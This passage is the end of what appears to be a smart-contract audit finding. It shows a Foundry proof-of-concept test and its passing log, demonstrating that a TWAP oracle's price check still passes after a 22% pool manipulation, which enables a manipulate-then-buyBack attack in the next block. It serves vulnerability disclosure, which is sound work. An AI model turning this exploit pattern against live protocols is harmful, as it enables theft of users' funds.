  uint256 priceChange;\n        if (priceAfter > priceBefore) {\n            priceChange = ((priceAfter - priceBefore) * 100) / priceBefore;\n        } else {\n            priceChange = ((priceBefore - priceAfter) * 100) / priceBefore;\n        }\n        console.log(\"Price change percent:     \", priceChange);\n\n        // Advance to next block so elapsedTime > 0\n        // This simulates the realistic attack: manipulate in block N, exploit in block N+1\n        vm.warp(block.timestamp + 12);\n\n        // validatePrice STILL passes with 0 slippage because TWAP = spot\n        bool result = oracle.validatePrice(0);\n        assertTrue(result, \"CRITICAL: validatePrice(0) passes even after massive price manipulation\");\n\n        console.log(\"validatePrice(0) = true AFTER manipulation (next block)\");\n        console.log(\"The TWAP oracle provides ZERO protection against price manipulation\");\n        console.log(\"Attack: manipulate pool in block N, call buyBack in block N+1\");\n    }\n}\n```\n\nResult :\n\n```solidity\nRan 1 test for test/Exploit_F2_UniswapTwapEqualsSpot.t.sol:Exploit_F2_Test\n[PASS] test_F2_twapPassesAfterManipulation() (gas: 280733)\nLogs:\n  === F-2 PROOF: Oracle Useless After Manipulation ===\n  Price before manipulation: 51179598972019816192001\n  Price after manipulation:  39793226485512085544101\n  Price change percent:      22\n  validatePrice(0) = true AFTER manipulation (next block)\n  The TWAP oracle provides ZERO protection against price manipulation\n  Attack: manipulate pool in block N, call buyBack in block N+1\n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.60s (4.05s CPU time)\n\nRan 1 test suite in 10.33s (8.60s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```",
